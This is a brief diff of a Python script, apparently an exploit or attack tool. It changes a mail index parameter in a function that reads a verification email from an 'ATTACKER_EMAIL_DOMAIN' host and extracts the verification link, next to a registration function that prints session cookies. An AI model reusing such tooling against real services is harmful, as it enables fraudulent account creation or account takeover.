@@ -49,7 +49,7 @@ def register():
         print(response.headers["Set-Cookie"])
 
 def verify_email():
-    url = f"https://{ATTACKER_EMAIL_DOMAIN}/email?raw=1"  # change raw index to your last mail index | 0 if you run at first time
+    url = f"https://{ATTACKER_EMAIL_DOMAIN}/email?raw=0"  # change raw index to your last mail index | 0 if you run at first time
     response = requests.get(url)
 
     verify_url = "https://" + response.text.split("https://")[1].split("Thanks")[0].strip()
